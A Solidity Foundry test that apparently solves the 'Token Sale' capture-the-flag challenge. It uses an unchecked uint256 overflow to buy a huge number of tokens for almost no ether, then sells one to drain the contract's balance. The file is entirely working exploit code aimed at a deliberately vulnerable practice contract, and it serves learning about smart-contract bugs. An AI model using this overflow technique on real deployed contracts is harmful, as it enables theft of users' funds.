// SPDX-License-Identifier: GPL-3.0-or-later

pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../src/TokenSaleChallenge.sol";


contract TokenSaleChallengeTest is Test {
    TokenSaleChallenge public tokenSaleChallenge;
    address alice = makeAddr("alice");

    function setUp() public {
        payable(alice).transfer(10 ether);
        tokenSaleChallenge = new TokenSaleChallenge{value: 1 ether}();
    }

    function testTokenSale() public {
        uint256 beforeValue = alice.balance;
        emit log_named_uint("alice value", beforeValue);
        uint256 MAX_INT = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;
        emit log_named_uint("MAX_INT", MAX_INT);
        uint256 temp0 = MAX_INT / 1 ether;
        emit log_named_uint("max div 1 ether", temp0);
        uint256 temp1 = temp0 * 1 ether;
        emit log_named_uint("temp1", temp1);
        uint256 temp2;
        unchecked {
            temp2 = (temp0 + 1) * 1 ether;
        }       
        emit log_named_uint("temp2", temp2);

        vm.startPrank(alice);
        
            tokenSaleChallenge.buy{value: temp2}(temp0+1);

            uint256 balance = tokenSaleChallenge.balanceOf(alice);
            emit log_named_uint("alice balance", balance);

            emit log_named_uint("contract balance", address(tokenSaleChallenge).balance);

            tokenSaleChallenge.sell(1);
            
        vm.stopPrank();

        uint256 laterValue = alice.balance;
        emit log_named_uint("alice value", laterValue);
        assertEq(tokenSaleChallenge.isComplete(), true);
    }

}